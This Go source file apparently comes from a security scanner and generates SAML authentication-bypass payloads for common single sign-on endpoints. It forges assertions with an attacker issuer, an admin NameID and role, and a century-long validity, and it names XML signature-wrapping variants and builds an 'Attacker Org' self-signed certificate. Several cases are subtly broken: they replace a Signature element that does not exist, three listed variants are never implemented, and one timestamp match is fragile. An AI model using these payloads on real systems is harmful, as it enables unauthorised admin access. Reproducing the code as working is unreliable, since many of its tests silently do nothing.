package lib

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"math/big"
	"strings"
	"time"
)

type SAMLBypassCase struct {
	method      string
	url         string
	headers     map[string]string
	body        string
	contentType string
	desc        string
}

type SAMLResponse struct {
	XMLName   xml.Name  `xml:"Response"`
	ID        string    `xml:"ID,attr"`
	Issuer    string    `xml:"Issuer"`
	Assertion Assertion `xml:"Assertion"`
	Status    Status    `xml:"Status"`
}

type Status struct {
	StatusCode string `xml:"StatusCode,attr"`
}

type Assertion struct {
	ID                 string             `xml:"ID,attr"`
	Subject            Subject            `xml:"Subject"`
	Conditions         Conditions         `xml:"Conditions"`
	AttributeStatement AttributeStatement `xml:"AttributeStatement"`
}

type Subject struct {
	NameID    string         `xml:"NameID"`
	Confirmed []Confirmation `xml:"SubjectConfirmation"`
}

type Confirmation struct {
	Method      string                  `xml:"Method,attr"`
	SubjectData SubjectConfirmationData `xml:"SubjectConfirmationData"`
}

type SubjectConfirmationData struct {
	NotOnOrAfter string `xml:"NotOnOrAfter,attr"`
}

type Conditions struct {
	NotBefore    string              `xml:"NotBefore,attr"`
	NotOnOrAfter string              `xml:"NotOnOrAfter,attr"`
	Audience     AudienceRestriction `xml:"AudienceRestriction"`
}

type AudienceRestriction struct {
	Audience string `xml:"Audience"`
}

type AttributeStatement struct {
	Attributes []Attribute `xml:"Attribute"`
}

type Attribute struct {
	Name  string `xml:"Name,attr"`
	Value string `xml:"AttributeValue"`
}

func BuildSAMLBypassCases(samlEndpoint string) []SAMLBypassCase {
	var cases []SAMLBypassCase

	if samlEndpoint == "" {
		samlEndpoints := []string{
			"/saml/acs",
			"/saml/login",
			"/sso/saml",
			"/api/saml/login",
			"/auth/saml",
			"/saml2/acs",
			"/saml2/sso",
		}
		for _, endpoint := range samlEndpoints {
			cases = append(cases, buildSAMLTestCasesForEndpoint(endpoint)...)
		}
	} else {
		cases = append(cases, buildSAMLTestCasesForEndpoint(samlEndpoint)...)
	}

	return cases
}

func buildSAMLTestCasesForEndpoint(endpoint string) []SAMLBypassCase {
	var cases []SAMLBypassCase

	basicSAMLResponse := createBasicSAMLResponse()

	cases = append(cases, SAMLBypassCase{
		method:      "POST",
		url:         endpoint,
		headers:     map[string]string{},
		body:        fmt.Sprintf("SAMLResponse=%s", base64.StdEncoding.EncodeToString([]byte(basicSAMLResponse))),
		contentType: "application/x-www-form-urlencoded",
		desc:        "SAML[basic response]",
	})

	assertionManipulations := []string{
		"ChangeIssuer",
		"RemoveSignature",
		"ModifyNameID",
		"ExtendConditions",
		"ChangeAttribute",
	}

	for _, manipulation := range assertionManipulations {
		modifiedResponse := manipulateSAMLResponse(basicSAMLResponse, manipulation)
		if modifiedResponse != "" {
			cases = append(cases, SAMLBypassCase{
				method:      "POST",
				url:         endpoint,
				headers:     map[string]string{},
				body:        fmt.Sprintf("SAMLResponse=%s", base64.StdEncoding.EncodeToString([]byte(modifiedResponse))),
				contentType: "application/x-www-form-urlencoded",
				desc:        fmt.Sprintf("SAML[%s]", manipulation),
			})
		}
	}

	xmlSignatureBypasses := []string{
		"XSW0_CommentInjection",
		"XSW1_ChildElementInsertion",
		"XSW2_DuplicateSignature",
		"XSW3_EmbeddedXML",
		"XSW4_HTTPPostBinding",
		"XSW5_FakeSignature",
		"XSW6_TransformedSignature",
	}

	for _, bypass := range xmlSignatureBypasses {
		modifiedResponse := applyXMLSignatureBypass(basicSAMLResponse, bypass)
		if modifiedResponse != "" {
			cases = append(cases, SAMLBypassCase{
				method:      "POST",
				url:         endpoint,
				headers:     map[string]string{},
				body:        fmt.Sprintf("SAMLResponse=%s", base64.StdEncoding.EncodeToString([]byte(modifiedResponse))),
				contentType: "application/x-www-form-urlencoded",
				desc:        fmt.Sprintf("SAML[%s]", bypass),
			})
		}
	}

	return cases
}

func createBasicSAMLResponse() string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="%s" Version="2.0" IssueInstant="%s">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="%s" Version="2.0" IssueInstant="%s">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>https://sp.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>user@example.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`,
		generateRandomID(),
		time.Now().Format(time.RFC3339),
		generateRandomID(),
		time.Now().Format(time.RFC3339),
		time.Now().Add(1*time.Hour).Format(time.RFC3339),
		time.Now().Add(-5*time.Minute).Format(time.RFC3339),
		time.Now().Add(1*time.Hour).Format(time.RFC3339),
	)
}

func manipulateSAMLResponse(original, manipulation string) string {
	switch manipulation {
	case "ChangeIssuer":
		return strings.Replace(original, "https://idp.example.com", "https://attacker.com", 1)
	case "RemoveSignature":
		return strings.Replace(original, "<ds:Signature>", "<ds:Signature><!-- REMOVED -->", 1)
	case "ModifyNameID":
		return strings.Replace(original, "user@example.com", "admin@example.com", 1)
	case "ExtendConditions":
		newConditions := strings.Replace(original,
			"NotOnOrAfter=\""+time.Now().Add(1*time.Hour).Format(time.RFC3339)+"\"",
			"NotOnOrAfter=\""+time.Now().Add(100*365*24*time.Hour).Format(time.RFC3339)+"\"", 1)
		return newConditions
	case "ChangeAttribute":
		return strings.Replace(original, "<saml:AttributeValue>user</saml:AttributeValue>", "<saml:AttributeValue>admin</saml:AttributeValue>", 1)
	}
	return ""
}

func applyXMLSignatureBypass(original, bypass string) string {
	switch bypass {
	case "XSW0_CommentInjection":
		return strings.Replace(original, "<ds:Signature>", "<ds:Signature><!-- attacker comment -->", 1)
	case "XSW1_ChildElementInsertion":
		insertion := `<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:SignedInfo>
    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
    <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
    <ds:Reference URI="#` + generateRandomID() + `">
      <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
      <ds:DigestValue>attacker-digest-value</ds:DigestValue>
    </ds:Reference>
  </ds:SignedInfo>
  <ds:SignatureValue>attacker-signature-value</ds:SignatureValue>
</ds:Signature><!-- Injected Signature -->`
		return strings.Replace(original, "<ds:Signature>...</ds:Signature>", insertion, 1)
	case "XSW2_DuplicateSignature":
		return original + "\n<!-- Duplicated Signature -->"
	case "XSW4_HTTPPostBinding":
		return strings.Replace(original, "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST", "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect", 1)
	}
	return original
}

func generateRandomID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("_%x", b)
}

func GenerateSelfSignedSAMLcertificate() (string, string, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", "", err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Attacker Org"},
			CommonName:   "attacker.com",
		},
		NotBefore: time.Now(),
		NotAfter:  time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:  x509.KeyUsageDigitalSignature,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return "", "", err
	}

	certPEM := base64.StdEncoding.EncodeToString(certDER)
	keyPEM := base64.StdEncoding.EncodeToString(x509.MarshalPKCS1PrivateKey(privateKey))

	return certPEM, keyPEM, nil
}

func BuildSAMLAssertion(url, nameID, issuer string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="%s" Version="2.0" IssueInstant="%s">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="%s" Version="2.0" IssueInstant="%s">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">%s</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="%s"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>%s</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`,
		generateRandomID(),
		time.Now().Format(time.RFC3339),
		generateRandomID(),
		time.Now().Format(time.RFC3339),
		issuer,
		nameID,
		time.Now().Add(1*time.Hour).Format(time.RFC3339),
		time.Now().Add(-5*time.Minute).Format(time.RFC3339),
		time.Now().Add(1*time.Hour).Format(time.RFC3339),
		url,
		nameID,
	)
}
